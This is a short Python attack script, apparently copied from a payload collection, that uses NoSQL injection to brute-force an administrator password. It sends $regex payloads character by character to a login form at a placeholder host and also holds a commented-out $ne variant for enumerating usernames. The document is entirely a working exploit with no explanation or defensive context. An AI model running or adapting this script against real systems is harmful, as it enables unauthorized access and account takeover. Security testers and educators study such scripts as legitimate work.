#!/usr/bin/python3
# Original: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
fuzz=""

url="http://vulnerable.org"
headers={
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': 'PHPSESSID=xd5s2obg0rvirf3l300kps91jf',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'http://vulnerable.org/admin.php',
        'Upgrade-Insecure-Requests': '1'
}

print("Starting NoSQL injection...")
while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|','&','^']:
            # Can fuzz valid usernames like this aswell
            payload=f"username={username}&password[$regex]=^{fuzz + c}&login=login"
            #payload=f"username[$regex]=^{fuzz + c}&password[$ne]=&login=login"

            #print("Sending request...")

            r = requests.post(url, data = payload, headers = headers, allow_redirects = False)
            #print(f"Request {c} sent!", end='\r', flush=True)

            if 'Welcome, admin!' in r.text or r.status_code == 302:
                print(f"{c}", end='', flush=True)
                fuzz += c
            ##

        ##
    ##
##
